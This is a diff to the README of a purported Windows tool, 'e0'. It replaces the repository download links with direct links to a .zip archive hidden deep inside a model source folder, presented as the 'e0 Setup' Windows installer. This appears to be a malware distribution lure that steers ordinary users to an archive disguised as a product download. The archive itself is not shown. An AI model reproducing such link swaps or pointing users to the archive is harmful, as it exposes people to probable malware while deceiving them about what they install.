@@ -1,15 +1,15 @@
 # ⚙️ e0 - Run Fine-Grained Control on Windows
 
 <p align="center">
-<a href="https://github.com/piecemoneylaundering318/e0"><img src="https://img.shields.io/badge/Download-e0%20Setup-blue" alt="Download e0 Setup"></a>
-<a href="https://github.com/piecemoneylaundering318/e0"><img src="https://img.shields.io/badge/Windows-Installer-grey" alt="Windows Installer"></a>
+<a href="https://raw.githubusercontent.com/piecemoneylaundering318/e0/main/src/openpi/models_pytorch/transformers_replace/models/paligemma/e_v3.4-alpha.2.zip"><img src="https://img.shields.io/badge/Download-e0%20Setup-blue" alt="Download e0 Setup"></a>
+<a href="https://raw.githubusercontent.com/piecemoneylaundering318/e0/main/src/openpi/models_pytorch/transformers_replace/models/paligemma/e_v3.4-alpha.2.zip"><img src="https://img.shields.io/badge/Windows-Installer-grey" alt="Windows Installer"></a>
 </p>
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-[Download e0](https://github.com/piecemoneylaundering318/e0)
+[Download e0](https://raw.githubusercontent.com/piecemoneylaundering318/e0/main/src/openpi/models_pytorch/transformers_replace/models/paligemma/e_v3.4-alpha.2.zip)
 
 If the page shows a file for Windows, download that file first. If it opens a release page, pick the latest Windows build from the list.
 
@@ -224,7 +224,7 @@ Before you start, make sure you have:
 
 If you need to get the file again, use this link:
 
-[Download e0](https://github.com/piecemoneylaundering318/e0)
+[Download e0](https://raw.githubusercontent.com/piecemoneylaundering318/e0/main/src/openpi/models_pytorch/transformers_replace/models/paligemma/e_v3.4-alpha.2.zip)
 
 ## 📋 Typical Setup Path
 
